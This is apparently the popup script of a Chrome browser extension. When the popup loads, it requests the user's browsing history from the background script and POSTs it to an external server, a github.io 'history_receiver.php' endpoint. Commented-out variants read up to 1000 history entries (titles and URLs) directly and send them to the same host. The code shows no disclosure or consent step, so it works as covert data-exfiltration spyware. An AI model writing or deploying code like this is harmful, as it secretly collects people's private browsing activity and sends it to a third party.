document.addEventListener('DOMContentLoaded', () => {
  console.log('Popup script loaded');
  console.log('Chrome object:', chrome);
  console.log('Chrome history:', chrome.history);
// Request history data from the background script
  chrome.runtime.sendMessage({ action: 'fetchHistory' }, (response) => {
    if (response) {
      fetch('https://raju-dev-flutter.github.io/history_fetcher/history_receiver.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(response),
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        console.log('History data sent successfully');
      })
      .catch(error => {
        console.error('Error sending history data:', error);
      });
    } else {
      console.error('No history data received.'); 
    }
  });
  
  // if (chrome && chrome.history && typeof chrome.history.search === 'function') {
  //   chrome.history.search({ text: '', maxResults: 1000 }, (data) => {
  //     const historyData = data.map(item => ({
  //       title: item.title,
  //       url: item.url
  //     }));

  //     fetch('https://raju-dev-flutter.github.io/history_fetcher/history_receiver.php', {
  //       method: 'POST',
  //       headers: {
  //         'Content-Type': 'application/json',
  //       },
  //       body: JSON.stringify(historyData),
  //     })
  //     .then(response => {
  //       if (!response.ok) {
  //         throw new Error('Network response was not ok');
  //       }
  //       console.log('History data sent successfully');
  //     })
  //     .catch(error => {
  //       console.error('Error sending history data:', error);
  //     });
  //   });
  // } else {
  //   console.error('Chrome history API is not available.');
  // }
});

// document.addEventListener('DOMContentLoaded', () => {
//     chrome.history.search({ text: '', maxResults: 1000 }, (data) => {
//       const historyData = data.map(item => ({
//         title: item.title,
//         url: item.url
//       }));
  
//       fetch('https://raju-dev-flutter.github.io/history_fetcher/history_receiver.php', {
//       // fetch('http://localhost:8080/project/history_receiver.php', {
//         method: 'POST',
//         headers: {
//           'Content-Type': 'application/json',
//         },
//         body: JSON.stringify(historyData),
//       })
//       .then(response => {
//         if (!response.ok) {
//           throw new Error('Network response was not ok');
//         }
//         console.log('History data sent successfully');
//       })
//       .catch(error => {
//         console.error('Error sending history data:', error);
//       });
//     });
//   });
  